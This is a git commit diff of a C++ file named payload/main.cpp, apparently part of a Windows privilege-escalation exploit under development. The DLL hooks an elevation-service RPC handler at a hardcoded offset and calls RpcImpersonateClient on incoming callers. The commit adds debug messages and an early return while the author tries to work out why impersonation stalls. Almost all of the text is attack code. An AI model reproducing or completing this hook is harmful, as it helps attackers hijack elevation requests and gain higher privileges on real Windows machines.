4aa4c00448f0b3a1dbef164083fd2738edd83eb9
Michael Torres <mic.ric.tor@gmail.com>
2024-05-26 19:59:33 -0700

    Try to debug why impersonation never returns

--- payload/main.cpp
+++ payload/main.cpp
@@ -4,7 +4,7 @@
 #include <psapi.h>
 #include <Lmcons.h>
 
-const DWORD kServerDoElevationRequestOffset = 0x8e840;
+const uint64_t kServerDoElevationRequestOffset = 0x8e840;
 struct rpc_internal_struct {
     unsigned int length;
     unsigned int reserved;
@@ -21,6 +21,7 @@ void __fastcall HookedServerDoElevationRequest(RPC_BINDING_HANDLE rpcHandle,
     HANDLE input_process_handle, HANDLE pipe_handle, HANDLE file_handle, int run_mode,
     rpc_internal_struct cmd, rpc_internal_struct param_7, rpc_internal_struct param_8,
     rpc_internal_struct param_9, GUID* input_guid, HANDLE output_process) {
+    OutputDebugStringA("Impersonation attempt.\n");
     RPC_STATUS result = RpcImpersonateClient(rpcHandle);
     if (result != RPC_S_OK) {
         char debugString[100];
@@ -30,6 +31,8 @@ void __fastcall HookedServerDoElevationRequest(RPC_BINDING_HANDLE rpcHandle,
     else {
         OutputDebugStringA("Impersonation successful.\n");
     }
+    OutputDebugStringA("Impersonation happened?.\n");
+    return;
     return OriginalServerDoElevationRequest(rpcHandle, input_process_handle, pipe_handle, file_handle, run_mode, cmd, param_7, param_8, param_9, input_guid, output_process);
 }
 
@@ -38,7 +41,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
         return TRUE;
     }
     HMODULE target_process_handle = GetModuleHandle(NULL);
-    OriginalServerDoElevationRequest = (fnServerDoElevationRequest_t)(target_process_handle + kServerDoElevationRequestOffset);
+    OriginalServerDoElevationRequest = (fnServerDoElevationRequest_t)((uint64_t)target_process_handle + kServerDoElevationRequestOffset);
 
     if (dwReason == DLL_PROCESS_ATTACH) {
         HMODULE target_process_handle = GetModuleHandle(NULL);
